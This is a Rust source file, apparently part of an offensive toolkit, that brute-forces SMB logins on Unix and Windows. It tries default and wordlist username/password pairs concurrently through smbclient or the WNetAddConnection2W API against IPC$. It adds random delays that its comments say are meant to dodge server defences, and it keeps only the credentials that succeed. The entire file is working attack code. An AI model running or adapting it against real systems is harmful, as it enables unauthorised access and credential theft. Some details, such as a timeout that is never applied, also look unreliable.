use crate::handler::brute::{BruteForceResult, BruteForceTask, Protocol, TaskStatus, BruteForceManager};
use std::sync::Arc;
use tokio::sync::{Mutex, Semaphore};
use std::time::{Duration, Instant};
use futures::future::join_all;
use rand::Rng;

// SMB暴力破解功能
pub async fn smb_brute_force(
    task: BruteForceTask,
    manager_state: Arc<Mutex<BruteForceManager>>
) -> Vec<BruteForceResult> {
    let target = task.target.clone();
    let port = task.port; // 默认445，但自定义端口在某些环境可能出现
    let task_id = task.id.unwrap_or(0);
    let num_threads = task.threads.max(1) as usize;
    
    // 获取用户名和密码列表
    let usernames = match (task.usernames.clone(), task.username_file.clone()) {
        (Some(names), _) if !names.is_empty() => names,
        (_, Some(file)) => super::read_wordlist_file(&file).await.unwrap_or_default(),
        _ => vec!["administrator".to_string(), "admin".to_string(), "guest".to_string()],
    };

    let passwords = match (task.passwords.clone(), task.password_file.clone()) {
        (Some(pwds), _) if !pwds.is_empty() => pwds,
        (_, Some(file)) => super::read_wordlist_file(&file).await.unwrap_or_default(),
        _ => vec!["".to_string(), "password".to_string(), "123456".to_string()],
    };

    if usernames.is_empty() || passwords.is_empty() {
        return Vec::new(); // 只返回成功结果，所以如果没有用户名或密码，直接返回空列表
    }

    let semaphore = Arc::new(Semaphore::new(num_threads));
    let mut spawned_tasks = Vec::new();

    'outer: for username in usernames {
        for password in &passwords {
            // 检查任务是否已从外部停止
            {
                let guard = manager_state.lock().await;
                if let Some(current_task_in_manager) = guard.tasks.iter().find(|t| t.id == Some(task_id)) {
                    if current_task_in_manager.status == TaskStatus::Stopped {
                        break 'outer;
                    }
                } else {
                    break 'outer;
                }
            }

            let permit = match semaphore.clone().acquire_owned().await {
                Ok(p) => p,
                Err(_) => break 'outer,
            };

            let t_target = target.clone();
            let t_port = port;
            let t_username = username.clone();
            let t_password = password.clone();
            let t_timeout_secs = task.timeout;
            let t_task_id = task_id;
            let t_protocol_clone = task.protocol.clone();
            
            // 增加随机延迟以避免触发服务器防御机制
            let delay_ms = rand::thread_rng().gen_range(10..100);
            tokio::time::sleep(Duration::from_millis(delay_ms)).await;

            spawned_tasks.push(tokio::spawn(async move {
                let start_time = Instant::now();
                
                // 添加重试逻辑
                let max_retries = 2;
                let mut retry_count = 0;
                
                while retry_count <= max_retries {
                    // SMB连接尝试
                    let result = try_smb_login(
                        t_target.clone(), 
                        t_port, 
                        t_username.clone(), 
                        t_password.clone(), 
                        t_timeout_secs
                    ).await;
                
                    if result.is_ok() {
                        let duration = start_time.elapsed().as_millis() as u64;
                        drop(permit);

                        return Some(BruteForceResult {
                            task_id: t_task_id,
                            target: t_target,
                            protocol: t_protocol_clone,
                            username: t_username,
                            password: t_password,
                            success: true,
                            time_taken: duration,
                            error: None,
                        });
                    }

                    // 如果连接失败且不是最后一次尝试，进行重试
                    if retry_count < max_retries {
                        retry_count += 1;
                        tokio::time::sleep(Duration::from_millis(500)).await;
                    } else {
                        // 达到最大重试次数，放弃尝试
                        break;
                    }
                }

                // 所有尝试都失败
                let duration = start_time.elapsed().as_millis() as u64;
                drop(permit);
                None // 不返回失败结果
            }));
        }
    }

    let mut results = Vec::new();
    for task_handle in join_all(spawned_tasks).await {
        match task_handle {
            Ok(Some(result)) => {
                results.push(result);
            }
            Ok(None) => {
                // 登录尝试失败，不做任何操作
            }
            Err(e) => {
                eprintln!("SMB brute force task panicked: {}", e);
                // 不添加占位错误结果
            }
        }
    }

    results
}

// 尝试SMB登录
#[cfg(unix)]
async fn try_smb_login(host: String, port: u16, username: String, password: String, timeout_secs: u64) -> Result<(), String> {
    use std::io;
    
    // 使用spawn_blocking执行外部命令，因为它会阻塞线程
    tokio::task::spawn_blocking(move || {
        // 构建SMB连接字符串
        let server_addr = if port != 445 {
            format!("smb://{}:{}", host, port)
        } else {
            format!("smb://{}", host)
        };
        
        // 使用smbclient命令行工具尝试连接
        let mut command = std::process::Command::new("smbclient");
        command.arg("-L")
               .arg(&server_addr)
               .arg("-U")
               .arg(format!("{}%{}", username, password))
               .arg("-t")
               .arg(format!("{}", timeout_secs));
        
        // 执行命令并检查结果
        match command.output() {
            Ok(output) => {
                if output.status.success() {
                    // 连接成功
                    return Ok(());
                } else {
                    // 连接失败，检查错误输出
                    let stderr = String::from_utf8_lossy(&output.stderr);
                    if stderr.contains("NT_STATUS_LOGON_FAILURE") {
                        return Err("Invalid credentials".to_string());
                    } else {
                        return Err(format!("SMB connection failed: {}", stderr));
                    }
                }
            }
            Err(err) => Err(format!("Failed to execute smbclient: {}", err)),
        }
    }).await.unwrap_or_else(|e| Err(format!("SMB task panic: {}", e)))
}

// Windows平台的SMB登录实现
#[cfg(windows)]
async fn try_smb_login(host: String, port: u16, username: String, password: String, timeout_secs: u64) -> Result<(), String> {
    use std::ffi::OsStr;
    use std::os::windows::ffi::OsStrExt;
    use std::ptr;
    use windows::Win32::Foundation::{ERROR_SUCCESS, WIN32_ERROR};
    use windows::Win32::NetworkManagement::WNet::{
        WNetAddConnection2W, NETRESOURCEW, RESOURCETYPE_DISK, 
        CONNECT_TEMPORARY
    };
    
    // 使用spawn_blocking执行Windows API调用，因为它可能会阻塞
    tokio::task::spawn_blocking(move || {
        // 构建网络资源路径
        let server_addr = if port != 445 {
            format!("\\\\{}:{}", host, port)
        } else {
            format!("\\\\{}", host)
        };
        
        // 转换为宽字符串
        let server_wide: Vec<u16> = OsStr::new(&server_addr)
            .encode_wide()
            .chain(std::iter::once(0))
            .collect();
        
        // 创建共享路径
        let share_path = format!("{}\\IPC$", server_addr);
        let share_wide: Vec<u16> = OsStr::new(&share_path)
            .encode_wide()
            .chain(std::iter::once(0))
            .collect();
        
        // 准备用户名和密码
        let user_wide: Vec<u16> = OsStr::new(&username)
            .encode_wide()
            .chain(std::iter::once(0))
            .collect();
        
        let pass_wide: Vec<u16> = OsStr::new(&password)
            .encode_wide()
            .chain(std::iter::once(0))
            .collect();
        
        // 创建网络资源结构
        let mut net_resource = NETRESOURCEW {
            dwScope: 0,
            dwType: RESOURCETYPE_DISK,
            dwDisplayType: 0,
            dwUsage: 0,
            lpLocalName: ptr::null_mut(),
            lpRemoteName: share_wide.as_ptr() as *mut u16,
            lpComment: ptr::null_mut(),
            lpProvider: ptr::null_mut(),
        };
        
        // 设置超时
        let _timeout = tokio::time::timeout(
            Duration::from_secs(timeout_secs),
            std::future::ready(())
        );
        
        // 尝试连接
        unsafe {
            let result = WNetAddConnection2W(
                &net_resource,
                pass_wide.as_ptr(),
                user_wide.as_ptr(),
                CONNECT_TEMPORARY,
            );
            
            if result == ERROR_SUCCESS.0 {
                return Ok(());
            } else {
                let error = WIN32_ERROR(result);
                return Err(format!("SMB connection failed: Error code {}", error.0));
            }
        }
    }).await.unwrap_or_else(|e| Err(format!("SMB task panic: {}", e)))
} 